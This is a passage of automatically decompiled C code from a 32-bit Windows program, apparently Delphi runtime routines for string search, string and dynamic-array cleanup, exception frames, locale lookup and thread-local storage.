    int32_t v1; // 0x40380e
    int32_t v2; // 0x40380e
    if (v1 == 0 || v2 == 0) {
        // 0x403847
        return 0;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x40381d
    int32_t v4 = *(int32_t *)(v2 - 4) - 1; // 0x403824
    if (v4 < 0 || v3 <= v4) {
        // 0x403847
        return 0;
    }
    // 0x40382e
    int32_t v5; // bp-16, 0x40380e
    int32_t v6 = &v5; // 0x403820
    int32_t v7 = v3 - v4; // 0x40382a
    bool v8; // 0x40380e
    int32_t v9 = v8 ? -1 : 1;
    int32_t * v10 = (int32_t *)(v6 - 4);
    bool v11 = v7 == 0; // 0x40380e
    int32_t v12 = v7; // 0x40380e
    int32_t v13 = v2 + 1; // 0x40383b
    int32_t result; // 0x40380e
    while (true) {
        // 0x40382e
        int32_t v14; // 0x40380e
        int32_t v15 = v14;
        int32_t v16 = v15; // 0x40382e
        int32_t v17 = v12; // 0x40382e
        int32_t v18; // 0x40380e
        if (v12 == 0) {
            // ._crit_edge
            v18 = v15;
            v12 = 0;
            result = 0;
            if (!v11) {
                // break -> 0x403847
                break;
            }
        } else {
            int32_t v19 = v16 + v9; // 0x40382e
            int32_t v20 = v17 - 1; // 0x40382e
            v18 = v19;
            v12 = v20;
            while (*(char *)v16 != (char)v2) {
                // .lr.ph
                v16 = v19;
                result = 0;
                if (v20 == 0) {
                    return result;
                }
                v19 = v16 + v9;
                v20--;
                v18 = v19;
                v12 = v20;
            }
        }
        int32_t v21 = v18; // 0x40383a
        *v10 = v13;
        *(int32_t *)(v6 - 8) = v21;
        int32_t v22 = v4; // 0x403838
        int32_t v23 = v21; // 0x403838
        if (v22 == 0) {
            // 0x40384a
            result = v21 - v5;
            return result;
        }
        int32_t v24 = v13;
        char v25 = *(char *)v23; // 0x403838
        v22--;
        int32_t v26 = v24 + v9; // 0x403838
        v23 += v9;
        while (*(char *)v24 == v25) {
            if (v22 == 0) {
                // 0x40384a
                result = v21 - v5;
                return result;
            }
            v24 = v26;
            v25 = *(char *)v23;
            v22--;
            v26 = v24 + v9;
            v23 += v9;
        }
        // 0x40383e
        v13 = *v10;
        v11 = false;
        v14 = v21;
    }
  lab_0x403847:
    // 0x403847
    return result;
}

// Address range: 0x403856 - 0x4038b8
int32_t function_403856(void) {
    int32_t v1 = 0; // 0x403861
    uint32_t v2; // 0x403856
    int32_t v3; // 0x403856
    if (v2 >= 1) {
        if (v3 != 0) {
            // 0x403869
            if (*(int32_t *)(v3 - 8) == 1) {
                // 0x40386f
                function_4024fa();
                *(char *)(v3 + v2) = 0;
                // 0x4038b4
                int32_t result; // 0x403856
                return result;
            }
        }
        int32_t v4 = function_40340a(); // 0x40388e
        v1 = 0;
        if (v4 != 0) {
            // 0x40389b
            function_4025be();
            v1 = v4;
        }
    }
    int32_t result2 = function_403372(); // 0x4038ad
    *(int32_t *)v3 = v1;
    // 0x4038b4
    return result2;
}

// Address range: 0x4038ba - 0x4038c1
int32_t function_4038ba(void) {
    // 0x4038ba
    return function_4025a2((int32_t)&g118);
}

// Address range: 0x4038c1 - 0x4038c2
int32_t function_4038c1(void) {
    // 0x4038c1
    int32_t result; // 0x4038c1
    return result;
}

// Address range: 0x4038c2 - 0x4038d7
int32_t function_4038c2(void) {
    // 0x4038c2
    int32_t result; // 0x4038c2
    if (result != 0) {
        // 0x4038c8
        *(int32_t *)result = 0;
        SysFreeString((int16_t *)result);
    }
    // 0x4038d6
    return result;
}

// Address range: 0x4038da - 0x4038fb
int32_t function_4038da(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4038da
    int32_t v1; // bp-8, 0x4038da
    int32_t v2 = &v1;
    int32_t v3; // 0x4038da
    int32_t * v4 = (int32_t *)v3; // 0x4038e0
    int32_t v5 = *v4; // 0x4038e0
    int32_t result = 0; // 0x4038e4
    int32_t v6 = v2; // 0x4038e4
    if (v5 != 0) {
        // 0x4038e6
        *v4 = 0;
        v6 = v2 - 4;
        *(int32_t *)v6 = v5;
        SysFreeString((int16_t *)&g118);
        result = &g118;
    }
    // 0x4038f2
    int32_t v7; // 0x4038da
    int32_t v8 = v7 - 1; // 0x4038f5
    v3 += 4;
    while (v8 != 0) {
        // 0x4038e0
        v2 = v6;
        v4 = (int32_t *)v3;
        v5 = *v4;
        result = 0;
        v6 = v2;
        if (v5 != 0) {
            // 0x4038e6
            *v4 = 0;
            v6 = v2 - 4;
            *(int32_t *)v6 = v5;
            SysFreeString((int16_t *)&g118);
            result = &g118;
        }
        // 0x4038f2
        v8--;
        v3 += 4;
    }
    // 0x4038f8
    return result;
}

// Address range: 0x4038fe - 0x403922
int32_t function_4038fe(void) {
    // 0x4038fe
    int32_t v1; // 0x4038fe
    int32_t v2; // 0x4038fe
    if (v2 == 0) {
        v1 = function_4038c2();
    }
    uint32_t v3 = *(int32_t *)(v2 - 4); // 0x403906
    int32_t v4 = v1; // 0x40390b
    if (v3 < 2) {
        v4 = function_4038c2();
    }
    int32_t result = SysReAllocStringLen((int16_t **)(v3 / 2), (int16_t *)v2, v4); // 0x403914
    if (result != 0) {
        // 0x403921
        return result;
    }
    function_4038ba();
    // UNREACHABLE
}

// Address range: 0x403922 - 0x403953
int32_t function_403922(void) {
    int32_t v1; // 0x403922
    for (uint32_t i = *(int32_t *)(v1 + 6 + (int32_t)*(char *)(v1 + 1)); i >= 1; i--) {
        // 0x403934
        function_40396e();
    }
    // 0x40394d
    int32_t result; // 0x403922
    return result;
}

// Address range: 0x403956 - 0x40396d
int32_t function_403956(void) {
    // 0x403956
    if (g12 != 0) {
        // 0x40395f
        int32_t result; // 0x403956
        return result;
    }
    // 0x403966
    function_4025a2((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x40396d - 0x40396e
int32_t function_40396d(void) {
    // 0x40396d
    int32_t result; // 0x40396d
    return result;
}

// Address range: 0x40396e - 0x403a58
int32_t function_40396e(void) {
    // 0x40396e
    int32_t v1; // 0x40396e
    int32_t result; // 0x40396e
    if (v1 == 0) {
        // 0x403a57
        return result;
    }
    int32_t v2; // 0x40396e
    switch ((char)v2) {
        case 10: {
            if (v1 > 1) {
                // 0x4039c2
                function_403396();
            } else {
                // 0x4039b8
                function_403372();
            }
            // 0x403a57
            return result;
        }
        case 11: {
            if (v1 > 1) {
                // 0x4039dc
                int32_t v3; // 0x40396e
                int32_t v4; // 0x40396e
                int32_t v5; // 0x40396e
                function_4038da(result, v5, v4, v3);
            } else {
                // 0x4039d5
                function_4038c2();
            }
            // 0x403a57
            return result;
        }
        case 12: {
            int32_t v6; // 0x40396e
            uint32_t v7 = v6;
            function_403956();
            v6 = v7 - 1;
            while (v7 > 1) {
                // 0x4039e5
                v7 = v6;
                function_403956();
                v6 = v7 - 1;
            }
            // 0x403a57
            return result;
        }
        case 13: {
            int32_t v8; // 0x40396e
            uint32_t v9 = v8;
            function_40396e();
            v8 = v9 - 1;
            while (v9 > 1) {
                // 0x4039f7
                v9 = v8;
                function_40396e();
                v8 = v9 - 1;
            }
            // 0x403a57
            return result;
        }
        case 14: {
            int32_t v10; // 0x40396e
            uint32_t v11 = v10;
            function_403922();
            v10 = v11 - 1;
            while (v11 > 1) {
                // 0x403a15
                v11 = v10;
                function_403922();
                v10 = v11 - 1;
            }
            // 0x403a57
            return result;
        }
        case 15: {
            int32_t v12; // 0x40396e
            uint32_t v13 = v12;
            function_403f92();
            v12 = v13 - 1;
            while (v13 > 1) {
                // 0x403a28
                v13 = v12;
                function_403f92();
                v12 = v13 - 1;
            }
            // 0x403a57
            return result;
        }
        case 17: {
            int32_t v14; // 0x40396e
            uint32_t v15 = v14;
            function_403e52();
            v14 = v15 - 1;
            while (v15 > 1) {
                // 0x403a37
                v15 = v14;
                function_403e52();
                v14 = v15 - 1;
            }
            // 0x403a57
            return result;
        }
    }
    // 0x403a48
    function_4025a2(result);
    // UNREACHABLE
}

// Address range: 0x403a5a - 0x403a71
int32_t function_403a5a(void) {
    // 0x403a5a
    if (g13 != 0) {
        // 0x403a63
        int32_t result; // 0x403a5a
        return result;
    }
    // 0x403a6a
    function_4025a2((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x403a71 - 0x403a72
int32_t function_403a71(void) {
    // 0x403a71
    int32_t result; // 0x403a71
    return result;
}

// Address range: 0x403a72 - 0x403b8c
int32_t function_403a72(void) {
    // 0x403a72
    int32_t v1; // 0x403a72
    int32_t v2 = v1 + 10 + (int32_t)*(char *)(v1 + 1); // 0x403a7f
    int32_t v3 = *(int32_t *)(v2 - 8); // bp-20, 0x403a8b
    int32_t result = 0; // 0x403a8b
    int32_t v4 = &v3; // 0x403a8b
    int32_t v5 = *(int32_t *)(v2 - 4); // 0x403a8b
    int32_t v6 = v2; // 0x403a8b
    while (true) {
        int32_t v7 = v4;
        int32_t * v8 = (int32_t *)(v6 + 4); // 0x403a8c
        if (*v8 > result) {
            // 0x403a93
            function_4025be();
        }
        int32_t v9 = *(int32_t *)*(int32_t *)v6; // 0x403aa3
        int32_t v10; // 0x403a72
        int32_t v11; // 0x403a72
        switch (*(char *)v9) {
            case 10: {
                // 0x403add
                function_4033c6();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b6b
                break;
            }
            case 11: {
                // 0x403aee
                function_4038fe();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b6b
                break;
            }
            case 12: {
                // 0x403aff
                function_403a5a();
                v10 = 16;
                v11 = v7;
                // break -> 0x403b6b
                break;
            }
            case 13: {
                int32_t v12 = (int32_t)*(char *)(v9 + 1); // 0x403b12
                int32_t v13 = v7 - 4; // 0x403b15
                *(int32_t *)v13 = *(int32_t *)(v9 + 2 + v12);
                int32_t * v14 = (int32_t *)(v7 - 8); // 0x403b19
                *v14 = *(int32_t *)(v9 + v12 + 6);
                function_403b8e((int32_t)&g118);
                v10 = *v14;
                v11 = v13;
                // break -> 0x403b6b
                break;
            }
            case 14: {
                int32_t * v15 = (int32_t *)(v7 - 4); // 0x403b39
                *v15 = *(int32_t *)(v9 + 2 + (int32_t)*(char *)(v9 + 1));
                function_403a72();
                v10 = *v15;
                v11 = v7;
                // break -> 0x403b6b
                break;
            }
            case 15: {
                // 0x403b49
                function_403faa();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b6b
                break;
            }
            case 17: {
                // 0x403b5a
                function_403e8e();
                v10 = 4;
                v11 = v7;
                // break -> 0x403b6b
                break;
            }
            default: {
                // 0x403ad2
                function_4025a2((int32_t)&g118);
                // UNREACHABLE
            }
        }
        // 0x403b6b
        v4 = v11;
        result = *v8 + v10;
        v5--;
        v6 += 8;
        if (v5 == 0) {
            // 0x403b78
            if (*(int32_t *)v4 > result) {
                // 0x403b87
                return function_4025be();
            }
            // 0x403b87
            return result;
        }
    }
    // 0x403ad2
    function_4025a2((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x403b8e - 0x403c80
int32_t function_403b8e(int32_t a1) {
    int32_t v1 = a1; // 0x403be3
    int32_t v2 = a1; // 0x403bfa
    int32_t v3 = a1; // 0x403c0e
    int32_t v4 = a1; // 0x403c4c
    int32_t v5 = a1; // 0x403c60
    int32_t v6 = a1; // 0x403c76
    int32_t result; // 0x403b8e
    int32_t result2; // 0x403c26
    int32_t v7; // 0x403b8e
    switch ((char)v7) {
        case 10: {
            v1--;
            result = function_4033c6();
            while (v1 != 0) {
                // 0x403bd4
                v1--;
                result = function_4033c6();
            }
            // 0x403c79
            return result;
        }
        case 11: {
            v2--;
            result = function_4038fe();
            while (v2 != 0) {
                // 0x403beb
                v2--;
                result = function_4038fe();
            }
            // 0x403c79
            return result;
        }
        case 12: {
            v3--;
            result = function_403a5a();
            while (v3 != 0) {
                // 0x403bff
                v3--;
                result = function_403a5a();
            }
            // 0x403c79
            return result;
        }
        case 13: {
            unsigned char v8 = *(char *)(v7 + 1); // 0x403c15
            int32_t v9; // bp-16, 0x403b8e
            int32_t v10 = &v9; // 0x403c18
            int32_t v11 = a1; // 0x403c18
            v10 -= 4;
            *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
            result2 = function_403b8e((int32_t)&g118);
            v11--;
            while (v11 != 0) {
                // 0x403c1c
                v10 -= 4;
                *(int32_t *)v10 = *(int32_t *)(v7 + 6 + (int32_t)v8);
                result2 = function_403b8e((int32_t)&g118);
                v11--;
            }
            // break -> 0x403c79
            break;
        }
        case 14: {
            function_403a72();
            v4--;
            while (v4 != 0) {
                // 0x403c34
                function_403a72();
                v4--;
            }
            // 0x403c79
            return (int32_t)*(char *)(v7 + 1);
        }
        case 15: {
            v5--;
            result = function_403faa();
            while (v5 != 0) {
                // 0x403c51
                v5--;
                result = function_403faa();
            }
            // 0x403c79
            return result;
        }
        case 17: {
            v6--;
            result = function_403e8e();
            while (v6 != 0) {
                // 0x403c65
                v6--;
                result = function_403e8e();
            }
            // 0x403c79
            return result;
        }
        default: {
            // 0x403bc9
            int32_t v12; // 0x403b8e
            function_4025a2(v12);
            // UNREACHABLE
        }
    }
    // 0x403c79
    return result2;
}

// Address range: 0x403c80 - 0x403c81
int32_t function_403c80(void) {
    // 0x403c80
    int32_t result; // 0x403c80
    return result;
}

// Address range: 0x403c82 - 0x403c89
int32_t function_403c82(void) {
    // 0x403c82
    return function_4025a2((int32_t)&g118);
}

// Address range: 0x403c89 - 0x403c8a
int32_t function_403c89(void) {
    // 0x403c89
    int32_t result; // 0x403c89
    return result;
}

// Address range: 0x403c8a - 0x403c92
int32_t function_403c8a(void) {
    int32_t result = 0; // 0x403c8c
    int32_t v1; // 0x403c8a
    if (v1 != 0) {
        // 0x403c8e
        result = *(int32_t *)(v1 - 4);
    }
    // 0x403c91
    return result;
}

// Address range: 0x403c92 - 0x403c99
int32_t function_403c92(void) {
    // 0x403c92
    return function_403c8a() - 1;
}

// Address range: 0x403c9a - 0x403ca9
int32_t function_403c9a(int32_t a1) {
    // 0x403c9a
    int32_t v1; // 0x403c9a
    return function_403b8e(v1);
}

// Address range: 0x403caa - 0x403caf
int32_t function_403caa(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x403caa
    return function_40396e();
}

// Address range: 0x403caf - 0x403cb0
int32_t function_403caf(void) {
    // 0x403caf
    int32_t result; // 0x403caf
    return result;
}

// Address range: 0x403cb2 - 0x403cb8
int32_t function_403cb2(int32_t a1, int32_t a2) {
    // 0x403cb2
    return function_403e52();
}

// Address range: 0x403cba - 0x403e46
int32_t function_403cba(int32_t a1) {
    int32_t v1 = *(int32_t *)a1; // 0x403cd3
    int32_t v2; // 0x403cba
    int32_t v3; // 0x403cba
    if (v1 >= 0 != v1 != 0) {
        if (v1 >= 0) {
            // 0x403e3d
            return function_403cb2(v2, v3);
        }
        // 0x403cdd
        function_4025a2(v2);
        // UNREACHABLE
    }
    int32_t v4 = 0; // 0x403cfa
    int32_t v5 = 0; // 0x403cfa
    int32_t v6; // 0x403cba
    if (v6 != 0) {
        // 0x403cfc
        v4 = *(int32_t *)(v6 - 4);
        v5 = v6 - 8;
    }
    int32_t v7 = v4;
    int32_t v8; // 0x403cba
    int32_t v9 = v8 + (int32_t)*(char *)(v8 + 1); // 0x403d0c
    int32_t v10 = *(int32_t *)(v9 + 2); // 0x403d10
    int32_t v11 = *(int32_t *)(v9 + 6); // 0x403d16
    int32_t v12 = 0; // 0x403d1b
    if (v11 != 0) {
        // 0x403d1d
        v12 = *(int32_t *)v11;
    }
    int32_t v13 = v10 * v1; // 0x403d25
    if (v10 != (int32_t)((0x100000000 * (int64_t)(v13 >> 31) | (int64_t)v13) / (int64_t)v1)) {
        // 0x403d36
        function_4025a2(v2);
        // UNREACHABLE
    }
    // 0x403d3d
    int32_t v14; // bp-48, 0x403cba
    int32_t v15 = &v14; // 0x403cc2
    int32_t v16; // 0x403cba
    int32_t v17; // 0x403cba
    if (v5 == 0) {
        goto lab_0x403d4a;
    } else {
        int32_t * v18 = (int32_t *)v5; // 0x403d45
        int32_t v19 = *v18; // 0x403d45
        if (v19 != 1) {
            // 0x403d7f
            *v18 = v19 - 1;
            int32_t v20 = function_4024ba(); // 0x403d84
            if (v12 == 0) {
                // 0x403dc7
                function_4025be();
                v16 = v20;
                v17 = v15;
            } else {
                int32_t v21 = v1 < v7 ? v1 : v7;
                function_402722();
                int32_t v22 = v21; // bp-52, 0x403db3
                function_403c9a(v21);
                v16 = v20;
                v17 = &v22;
            }
            goto lab_0x403ddd;
        } else {
            goto lab_0x403d4a;
        }
    }
  lab_0x403d4a:
    if (v1 < v7 && v12 != 0) {
        // 0x403d56
        int32_t v23; // 0x403cba
        int32_t v24; // 0x403cba
        int32_t v25; // 0x403cba
        function_403caa(v2, v3, v7, v10, v13 + 8, v5, v25, v24, v23);
    }
    // 0x403d6f
    function_4024fa();
    v16 = v5;
    v17 = v15;
    goto lab_0x403ddd;
  lab_0x403ddd:
    // 0x403ddd
    *(int32_t *)v16 = 1;
    *(int32_t *)(v16 + 4) = v1;
    function_402722();
    int32_t result; // 0x403cba
    if (v3 < 2) {
        // 0x403e38
        *(int32_t *)v6 = v16 + 8;
        // 0x403e3d
        return result;
    }
    int32_t v26 = 0; // 0x403e14
    if (v1 < 1) {
        // 0x403e38
        *(int32_t *)v6 = v16 + 8;
        // 0x403e3d
        return result;
    }
    int32_t v27 = v17 - 4; // 0x403e21
    *(int32_t *)v27 = a1 + 4;
    function_403cba(v26);
    int32_t v28 = v1 - 1; // 0x403e35
    v26++;
    int32_t v29 = v27; // 0x403e36
    int32_t v30 = v28; // 0x403e36
    while (v28 != 0) {
        // 0x403e1e
        v27 = v29 - 4;
        *(int32_t *)v27 = a1 + 4;
        function_403cba(v26);
        v28 = v30 - 1;
        v26++;
        v29 = v27;
        v30 = v28;
    }
    // 0x403e38
    *(int32_t *)v6 = v16 + 8;
    // 0x403e3d
    return result;
}

// Address range: 0x403e46 - 0x403e51
int32_t function_403e46(void) {
    // 0x403e46
    int32_t v1; // 0x403e46
    return function_403cba((int32_t)&v1 + 4);
}

// Address range: 0x403e52 - 0x403e8c
int32_t function_403e52(void) {
    // 0x403e52
    int32_t result; // 0x403e52
    if (result == 0) {
        // 0x403e8b
        return result;
    }
    // 0x403e58
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x403e5e
    int32_t v2 = *v1 - 1; // 0x403e5e
    *v1 = v2;
    if (v2 != 0) {
        // 0x403e8b
        return result;
    }
    // 0x403e64
    int32_t v3; // 0x403e52
    if (*(int32_t *)(v3 + 6 + (int32_t)*(char *)(v3 + 1)) != 0) {
        // 0x403e74
        if (*(int32_t *)(result - 4) != 0) {
            // 0x403e7b
            function_40396e();
        }
    }
    // 0x403e82
    function_4024da();
    // 0x403e8b
    return result;
}

// Address range: 0x403e8e - 0x403eb5
int32_t function_403e8e(void) {
    // 0x403e8e
    int32_t v1; // 0x403e8e
    if (v1 != 0) {
        int32_t * v2 = (int32_t *)(v1 - 8); // 0x403e95
        *v2 = *v2 + 1;
    }
    int32_t result; // 0x403e8e
    if (result == 0) {
        // 0x403eb1
        return result;
    }
    int32_t * v3 = (int32_t *)(result - 8); // 0x403e9d
    int32_t v4 = *v3; // 0x403e9d
    int32_t v5 = v4 - 1; // 0x403e9d
    *v3 = v5;
    if (v5 == 0) {
        // 0x403ea3
        *v3 = v4;
        function_403e52();
    }
    // 0x403eb1
    return result;
}

// Address range: 0x403eb6 - 0x403f10
int32_t function_403eb6(void) {
    // 0x403eb6
    if (g19 == 0) {
        // 0x403f09
        return 0;
    }
    // 0x403ed0
    int32_t v1; // bp-24, 0x403eb6
    int32_t v2 = &v1; // 0x403ebe
    int32_t v3 = v2 - 12;
    int32_t * v4 = (int32_t *)v3;
    int32_t result = g19; // 0x403efe
    int32_t v5; // bp-4, 0x403eb6
    *(int32_t *)(v2 - 4) = (int32_t)&v5;
    *(int32_t *)(v2 - 8) = 0x403ef1;
    *v4 = __readfsdword(0);
    __writefsdword(0, v3);
    __writefsdword(0, *v4);
    result = *(int32_t *)result;
    while (result != 0) {
        // 0x403ed0
        *(int32_t *)(v2 - 4) = (int32_t)&v5;
        *(int32_t *)(v2 - 8) = 0x403ef1;
        *v4 = __readfsdword(0);
        __writefsdword(0, v3);
        __writefsdword(0, *v4);
        result = *(int32_t *)result;
    }
    // 0x403f09
    return result;
}

// Address range: 0x403f12 - 0x403f20
int32_t function_403f12(void) {
    // 0x403f12
    int32_t result; // 0x403f12
    *(int32_t *)result = g18;
    return result;
}

// Address range: 0x403f22 - 0x403f86
int32_t function_403f22(void) {
    int32_t v1 = __readfsdword(0); // bp-20, 0x403f31
    __writefsdword(0, (int32_t)&v1);
    function_403eb6();
    __writefsdword(0, v1);
    int32_t result; // 0x403f22
    int32_t v2; // 0x403f22
    if (v2 == g18) {
        // 0x403f85
        return result;
    }
    // 0x403f66
    if (g18 == 0) {
        // 0x403f85
        return 0;
    }
    int32_t result2 = g18;
    int32_t * v3 = (int32_t *)result2;
    int32_t v4 = *v3; // 0x403f6f
    while (v4 != v2) {
        // 0x403f7f
        result = v4;
        if (v4 == 0) {
            // 0x403f85
            return result;
        }
        result2 = v4;
        v3 = (int32_t *)result2;
        v4 = *v3;
    }
    // 0x403f76
    *v3 = result2;
    // 0x403f85
    return result2;
}

// Address range: 0x403f86 - 0x403f8b
int32_t function_403f86(void) {
    // 0x403f86
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x403f8b - 0x403f8d
int32_t function_403f8b(void) {
    // 0x403f8b
    int32_t result; // 0x403f8b
    return result;
}

// Address range: 0x403f8d - 0x403f90
int32_t function_403f8d(int32_t a1, int32_t a2) {
    // 0x403f8d
    int32_t result; // 0x403f8d
    return result;
}

// Address range: 0x403f92 - 0x403fa7
int32_t function_403f92(void) {
    // 0x403f92
    int32_t result; // 0x403f92
    if (result != 0) {
        // 0x403f98
        *(int32_t *)result = 0;
    }
    // 0x403fa6
    return result;
}

// Address range: 0x403faa - 0x403fd6
int32_t function_403faa(void) {
    // 0x403faa
    int32_t result; // 0x403faa
    if (result != 0) {
        // 0x403fae
        return result;
    }
    // 0x403fc7
    int32_t result2; // 0x403faa
    *(int32_t *)result2 = 0;
    return result2;
}

// Address range: 0x403fd6 - 0x40403c
int32_t function_403fd6(void) {
    int32_t v1 = __readfsdword(0); // bp-36, 0x403fea
    __writefsdword(0, (int32_t)&v1);
    int32_t LCType; // bp-15, 0x403fd6
    int32_t cchData; // 0x403fd6
    GetLocaleInfoA(7, (int32_t)&LCType, (char *)0x1004, cchData);
    function_4034b2();
    function_4027ae();
    __writefsdword(0, cchData);
    return function_403372();
}

// Address range: 0x40403c - 0x404041
int32_t function_40403c(void) {
    // 0x40403c
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404041 - 0x404043
int32_t function_404041(void) {
    // 0x404041
    int32_t result; // 0x404041
    return result;
}

// Address range: 0x404043 - 0x40404a
int32_t function_404043(int32_t a1) {
    // 0x404043
    int32_t result; // 0x404043
    return result;
}

// Address range: 0x40404a - 0x404094
int32_t function_40404a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404055
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g59 + 1; // 0x40405b
    g59 = v2;
    if (v2 == 0) {
        // 0x404063
        function_40263e();
        function_40263e();
        function_40263e();
        function_4018be();
    }
    // 0x404086
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404094 - 0x404099
int32_t function_404094(void) {
    // 0x404094
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404099 - 0x40409b
int32_t function_404099(void) {
    // 0x404099
    int32_t result; // 0x404099
    return result;
}

// Address range: 0x40409b - 0x40409d
int32_t function_40409b(int32_t a1) {
    // 0x40409b
    int32_t result; // 0x40409b
    return result;
}

// Address range: 0x40409e - 0x404171
int32_t function_40409e(void) {
    int32_t v1 = g59; // 0x40409e
    g59 = v1 - 1;
    if (v1 != 0) {
        // 0x404170
        int32_t result; // 0x40409e
        return result;
    }
    // 0x4040ab
    *(char *)&g11 = 2;
    g42 = 0x40106a;
    g43 = 0x401072;
    *(char *)&g52 = 2;
    g40 = 0x403c82;
    if ((char)function_4028ba() != 0) {
        // 0x4040e0
        function_4028ea();
    }
    // 0x4040e5
    *(int16_t *)&g54 = -0x2850;
    g55 = -0x2850;
    *(int16_t *)&g56 = -0x2850;
    g48 = (int32_t)GetCommandLineA();
    g47 = function_40110a();
    if (GetVersion() < 0) {
        // 0x404157
        GetThreadLocale();
        g60 = function_403fd6();
    } else {
        // 0x40412a
        if ((GetVersion() & 255) < 5) {
            // 0x404146
            GetThreadLocale();
            g60 = function_403fd6();
        } else {
            // 0x40413a
            g60 = 3;
        }
    }
    int32_t threadId = GetCurrentThreadId(); // 0x404166
    g45 = threadId;
    // 0x404170
    return threadId;
}

// Address range: 0x404172 - 0x404178
int32_t function_404172(int32_t a1, int32_t a2) {
    // 0x404172
    return LocalAlloc2();
}

// Address range: 0x40417a - 0x404180
int32_t function_40417a(int32_t a1) {
    // 0x40417a
    return LocalFree2();
}

// Address range: 0x404182 - 0x404188
int32_t function_404182(void) {
    // 0x404182
    return TlsAlloc();
}

// Address range: 0x40418a - 0x404190
bool function_40418a(int32_t dwTlsIndex) {
    // 0x40418a
    return TlsFree(dwTlsIndex);
}

// Address range: 0x404192 - 0x404198
int32_t * function_404192(int32_t dwTlsIndex) {
    // 0x404192
    return TlsGetValue(dwTlsIndex);
}

// Address range: 0x40419a - 0x4041a0
bool function_40419a(int32_t dwTlsIndex, int32_t * lpTlsValue) {
    // 0x40419a
    return TlsSetValue(dwTlsIndex, lpTlsValue);
}

// Address range: 0x4041a2 - 0x4041ab
int32_t function_4041a2(void) {
    // 0x4041a2
    int32_t v1; // 0x4041a2
    return function_404172(v1, 64);
}

// Address range: 0x4041ae - 0x4041b4
int32_t function_4041ae(int32_t a1) {
    // 0x4041ae
    return 8;
}

// Address range: 0x4041b6 - 0x4041fa
int32_t function_4041b6(void) {
    // 0x4041b6
    int32_t v1; // 0x4041b6
    if (function_4041ae(v1) == 0) {
        // 0x4041f8
        return 0;
    }
    // 0x4041c2
    if (g21 == -1) {
        // 0x4041cb
        function_403366((int32_t)&g118);
        // UNREACHABLE
    }
    int32_t dwTlsIndex = function_4041a2(); // 0x4041d7
    if (dwTlsIndex != 0) {
        // 0x4041f8
        return TlsSetValue(dwTlsIndex, (int32_t *)g21);
    }
    // 0x4041e0
    function_403366((int32_t)&g118);
    // UNREACHABLE
}

// Address range: 0x4041fa - 0x404223
int32_t function_4041fa(void) {
    // 0x4041fa
    g21 = TlsAlloc();
    function_4041b6();
    int32_t result = (int32_t)TlsGetValue(g21); // 0x404218
    g85 = result;
    return result;
}

// Address range: 0x404226 - 0x40424e
int32_t function_404226(void) {
    // 0x404226
    if (g21 == -1) {
        // 0x40424d
        return 8;
    }
    int32_t * v1 = TlsGetValue(g21); // 0x40423e
    int32_t v2 = (int32_t)v1; // 0x40423e
    int32_t result = v2; // 0x404245
    if (v1 != NULL) {
        // 0x404247
        result = function_40417a(v2);
    }
    // 0x40424d
    return result;
}

// Address range: 0x40424e - 0x404271
int32_t function_40424e(void) {
    int32_t result = function_404226(); // 0x404263
    if (g21 != -1) {
        // 0x404265
        result = TlsFree(g21);
    }
    // 0x404270
    return result;
}

// Address range: 0x404272 - 0x4042b2
int32_t function_404272(void) {
    // 0x404272
    if (g81 == 0) {
        // 0x404281
        return *(int32_t *)(__readfsdword(44) + 4 * g21);
    }
    int32_t * v1 = TlsGetValue(g21); // 0x4042a8
    if (v1 != NULL) {
        // 0x4042b1
        return (int32_t)v1;
    }
    // 0x40428c
    function_4041b6();
    int32_t * v2 = TlsGetValue(g21); // 0x404297
    if (v2 == NULL) {
        // 0x4042a1
        return g85;
    }
    // 0x4042a0
    return (int32_t)v2;
}

// Address range: 0x4042b2 - 0x4042bd
int32_t function_4042b2(int32_t a1, int32_t a2) {
    // 0x4042b2
    return function_403f12();
}

// Address range: 0x4042be - 0x404304
int32_t function_4042be(void) {
    // 0x4042be
    int32_t v1; // 0x4042be
    if (*(int32_t *)(v1 + 12) == 1) {
        // 0x4042c9
        g81 = 1;
        int32_t v2 = *(int32_t *)(v1 + 8); // 0x4042d2
        g82 = (int32_t (*)(int32_t, int32_t, int32_t))v2;
        g23 = v2;
        g24 = 0;
        g25 = 0;
        int32_t v3; // 0x4042be
        function_4042b2(v3, (int32_t)&g22);
    }
    // 0x4042f3
    return function_4030a2(g83);
}

// Address range: 0x404306 - 0x40432b
int32_t function_404306(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404311
    __writefsdword(0, (int32_t)&v1);
    g84++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40432b - 0x404330
int32_t function_40432b(void) {
    // 0x40432b
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404330 - 0x404332
int32_t function_404330(void) {
    // 0x404330
    int32_t result; // 0x404330
    return result;
}

// Address range: 0x404332 - 0x404334
int32_t function_404332(int32_t a1) {
    // 0x404332
    int32_t result; // 0x404332
    return result;
}

// Address range: 0x404336 - 0x40433e
int32_t function_404336(void) {
    // 0x404336
    g84--;
    int32_t result; // 0x404336
    return result;
}

// Address range: 0x40433e - 0x404363
int32_t function_40433e(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404349
    __writefsdword(0, (int32_t)&v1);
    g86++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404363 - 0x404368
int32_t function_404363(void) {
    // 0x404363
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404368 - 0x40436a
int32_t function_404368(void) {
    // 0x404368
    int32_t result; // 0x404368
    return result;
